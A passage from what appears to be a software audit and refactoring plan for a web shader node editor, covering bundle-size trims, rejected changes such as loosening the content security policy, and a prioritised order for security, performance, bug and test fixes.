- **~208 KB** — non-latin `@fontsource` subsets shipped (cyrillic/greek/vietnamese) for an
  EN/LV UI. Switch `main.tsx`/`nodeEditor.tsx`/`nodeDesigner/main.ts` to per-subset imports,
  **keeping latin + latin-ext** (Latvian diacritics live in latin-ext). Zero runtime cost
  today (unicode-range); deploy/desktop weight only.
- **~228 KB** — `stanford-bunny.obj` at 6 decimals on a pre-normalized mesh; trim to 5
  decimals (4 risks merging at the 1e-4 weld quantum). Preview-only geometry.
- **`audit/`** (28 KB, stale 2026-05-20) and **`CONTEXT.md`** (1,241 lines, a growing manual
  twin of CLAUDE.md) — confirm no external consumer, then fold/delete. (Left as UNCERTAIN by
  the agent — check before deleting.)
- **Optional** — a `src/utils/fsKeys.ts` constants module for the `fs:*` localStorage /
  postMessage names (e.g. `'fs:uniform'` re-typed in 7 files); a typo fails silently today.
  Capped value — podest/ShaderCarousel are standalone pages that must keep literal strings.

---

## Explicitly REJECTED / out of scope (do not spend time here)

- **CSP `unsafe-inline`/`unsafe-eval`** — required for TSL/Monaco/A-Frame + the srcDoc
  iframe; documented at `vite.config.ts:62-73`, no live attacker path found. Keep.
- **Flat vector-op cost** — `GPU_COST_ANALYSIS.md:104` now defends it with citations
  (component-wise ops cost ≈ scalar on Adreno/Mali SIMD). Not a bug.
- **Registry template-DSL refactor** — prior verdict REJECT (byte-identical emission is
  load-bearing; `slider`/`float` collide; generic paths already exist).
- **Large-file decomposition** of `useAppStore.ts` (2287) / `NodeEditor.tsx` (2942) — every
  extraction candidate closes over React Flow accessors + shared refs; the pure logic already
  lives in tested utils. Churn without testability gain. Skip unless touching for another reason.
- **podest `fit-bounds` dedupe** — the hand-minified twin is deliberate (standalone no-build
  page) and `previewFitBounds.test.ts` guards drift. (Note: the WebGPU *pre-flight* twin has
  no drift test — add one if convenient, but don't dedupe.)

---

## Recommended order (value-first)

1. **SEC-1** (injection) — with its junk-value sweep. Highest value, self-contained.
2. **SEC-2/3/4** (data-node cap, exposedPorts guard, edge-extras) — one adversarial-input
   batch, all BYTE-SAFE, cheap, each with a small test.
3. **History-bracketing batch** — PERF-1/2/5/6. One convention, user-visible (undo works),
   all BYTE-SAFE.
4. **BUG-1** (materialSettings) — user-visible correctness; pairs with the `mergeMatch`
   extraction that unlocks its test.
5. **Hot-path batch** — PERF-3/4/7/8 + CLEAN-1. Measurable drag smoothness.
6. **Correctness batch** — BUG-2/4/5, COST-1.
7. **P1 tests** — TEST-1..4 (independent; can run in parallel with any batch).
8. **Cleanup batch** — P3 + repo hygiene + DOC-1. Consider `noUnusedLocals: true` last so it
   doesn't block earlier work.
